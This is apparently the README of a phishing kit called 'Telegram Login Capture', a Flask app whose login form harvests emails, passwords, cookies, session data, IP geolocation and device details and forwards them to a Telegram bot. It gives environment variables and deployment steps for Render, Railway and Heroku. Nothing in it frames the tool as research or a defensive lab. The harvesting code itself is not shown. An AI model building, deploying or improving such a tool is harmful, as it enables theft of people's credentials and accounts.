# Telegram Login Capture

A Flask application that captures login credentials and forwards them to a Telegram bot.

## Features
- Login form with email/password capture
- Real-time forwarding to Telegram bot
- IP geolocation tracking
- Device and browser information capture
- Cookies and session data collection

## Deployment

### Environment Variables
Set these on your hosting platform:
- `TELEGRAM_BOT_TOKEN` - Your Telegram bot token
- `TELEGRAM_CHAT_ID` - Your Telegram chat ID
- `SECRET_KEY` - Flask secret key

### Deploy to Render/Railway/Heroku
1. Push code to GitHub
2. Connect your repository
3. Set environment variables
4. Deploy!

### Local Development
```bash
pip install -r requirements.txt
python app.py
```

Visit `http://localhost:5000`
